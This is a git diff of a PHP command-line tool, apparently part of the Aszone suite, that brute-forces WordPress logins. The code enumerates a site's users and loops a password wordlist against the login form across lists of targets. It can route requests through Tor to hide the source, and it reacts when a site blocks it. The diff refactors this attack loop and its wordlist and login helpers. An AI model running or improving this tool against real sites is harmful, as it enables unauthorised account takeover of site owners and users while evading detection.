@@ -15,7 +15,6 @@ use Aszone\WordPress\WordPress;
 use Aszone\Site\Site;
 use Aszone\ProxySiteList\ProxySiteList;
 use Service\Mailer;
-use Service\GuzzleTor;
 
 
 
@@ -107,36 +106,29 @@ class BruteForceController extends Command{
      * @param InputInterface $input
      * @param OutputInterface $output
      */
-    protected function executeBruteForceWordPress(InputInterface $input, OutputInterface $output){
+    protected function executeBruteForceWordPress(InputInterface $input, OutputInterface $output)
+    {
 
         //$wordlistClass = new Wordlist();
         //$dataBruteForceWordPress = new \StdClass;
         $target      = $input->getArgument('target');
         $username    = $input->getOption('username');
         $wordlist    = $input->getOption('wordlist');
-        $optionTor   = $input->getOption('tor');
-        $optionMail   = $input->getOption('mail');
+        $tor          = $input->getOption('tor');
+        $optionMail   = $input->getOption('email');
         $ProxySiteList= $input->getOption('proxySiteList');
 
         //verify if target is list or one
         $targets=$this->getTargetsInArray($target);
 
-        //verify is wordlist and set wordlist default
-        $wordlist=$this->getWordListInArray($wordlist);
 
-        //Use Tor
-        $tor=false;
-        if($optionTor){
-            $middleware = new GuzzleTor();
-            $tor=$middleware->tor();
-        }
 
         $resultFinal = array();
 
-        if($targets!=false && $wordlist!=false){
-
+        $oldTargets=[];
+        if($targets!=false ){
             //CONFIG PROFRESSBAR
-            $progress = new ProgressBar($output, count($wordlist)*count($targets) );
+            $progress = new ProgressBar($output, 351*count($targets) );
             $progress=$this->configBar($progress);
 
             foreach ($targets as $keyTarget => $valueTarget) {
@@ -145,11 +137,14 @@ class BruteForceController extends Command{
                 $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
 
                 $wp = new WordPress($valueTarget);
-                $wp->setTor($tor);
-
+                if($tor)
+                {
+                    $wp->setTor();
+                }
 
                 //VERIFY IF EXIST USER ESPECIFY, IF CASE NOT, LIST USER OF WORDPRESS
                 $output->writeln("<info>Searching for users, wait...</info>");
+
                 $usernames=$this->getUsernamesInArray($username,$wp);
 
                 $output->writeln("<info></info>");
@@ -158,24 +153,31 @@ class BruteForceController extends Command{
                 //VERIFY IS WORDPRESS
                 $isWordPress=$wp->isWordPress();
 
+
+                //RETURN BASENAME OF TARGET WP
+                $baseUrlWordPress=$wp->getBaseUrlWordPressByUrl();
+
+                //verify is wordlist and set wordlist default
+                $wordlist=$wp->getWordListInArray($wordlist);
+
                 //VALIDATEE IF IS WORDPRESS AND EXIST USERNAMES
-                if($isWordPress && $usernames!=false){
-                    $baseUrlWordPress=$wp->getBaseUrlWordPressByUrl($valueTarget);
+                if($isWordPress && $usernames!=false && array_search($baseUrlWordPress,$oldTargets)==false){
 
                     foreach($usernames as $username){
                         $output->writeln("<info>Search password of ".$username."</info>");
                         foreach ($wordlist as $keyWordList => $valueWordList) {
-
+                            echo $valueWordList."\n";
                             $progress->advance();
 
-                            $returnHtml=$this->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress,$tor['proxy']);
+                            $returnHtml=$wp->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress);
                             //verify if is block and change ip of tor
                             if(($returnHtml['status']=='403')OR($returnHtml['status']=='500')OR($returnHtml['status']=='401')){
                                 //change ip of tor
-
+                                echo "error";
+                                break;
                             }
 
-                            $validateLogon=$this->validateLogon($returnHtml['body']);
+                            $validateLogon=$wp->validateLogon($returnHtml['body']);
 
                             if($validateLogon){
 
@@ -203,9 +205,11 @@ class BruteForceController extends Command{
 
                         }
                     }
+                    $username=false;
                 }else{
                     $output->writeln("<error>Users not found or This site is not WordPress...</error>");
                 }
+                $oldTargets[]=$baseUrlWordPress;
             }
             $progress->finish();
 
@@ -253,6 +257,7 @@ class BruteForceController extends Command{
 
         //verify is wordlist and set wordlist default
         $wordlist=$this->getWordListInArray($wordlist);
+
 
         if($targets!=false && $wordlist!=false)
         {
@@ -307,12 +312,11 @@ class BruteForceController extends Command{
                 }else{
                     echo "não é admin";
                 }
-
             }
         }
     }
 
-    protected function sendDataToLoginWordPress($username,$password,$target,$tor=""){
+    /*protected function sendDataToLoginWordPress($username,$password,$target,$tor=""){
 
 
         $cookie="cookie.txt";
@@ -339,41 +343,11 @@ class BruteForceController extends Command{
         curl_close($ch);
         return $result;
 
-    }
+    }*/
 
-    protected function validateLogon($html){
-        
-        //preg_match("/<strong>(.+?)<\/strong>/", $html, $resultMatches, PREG_OFFSET_CAPTURE, 3);
 
-        $pos = strpos($html, "<strong>ERRO</strong>");
-        if($pos !== false){
-           return false;
-        }
-        return true;
-    }
 
-    protected function getWordListInArray($wordlist=""){
 
-        if(empty($wordlist)){
-            $zip = new \ZipArchive;
-            $zip->open('resource/wordlist.zip');
-            $zip->extractTo('resource/tmp/');
-            $zip->close();
-            $wordlist    = 'resource/tmp/wordlist.txt';
-            $arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
-            unlink($wordlist);
-            return $arrWordlist;
-        }
-
-        $checkFileWordList  = v::file()->notEmpty()->validate($wordlist);
-        if($checkFileWordList){
-            $targetResult   = file($wordlist,FILE_IGNORE_NEW_LINES);
-            return $targetResult;
-        }
-
-        return false;
-
-    }
 
     protected function getTargetsInArray($target){
 
@@ -396,9 +370,10 @@ class BruteForceController extends Command{
 
     protected function getUsernamesInArray($username,$wp){
 
-        if(empty($username)){
+        if(!$username){
             //VERIFY IF LIST TXT OR SEARCH IN WORDPRESS SITE
             $usernames=$wp->getUsers();
+
             if(empty($usernames)){
                 return false;
             }
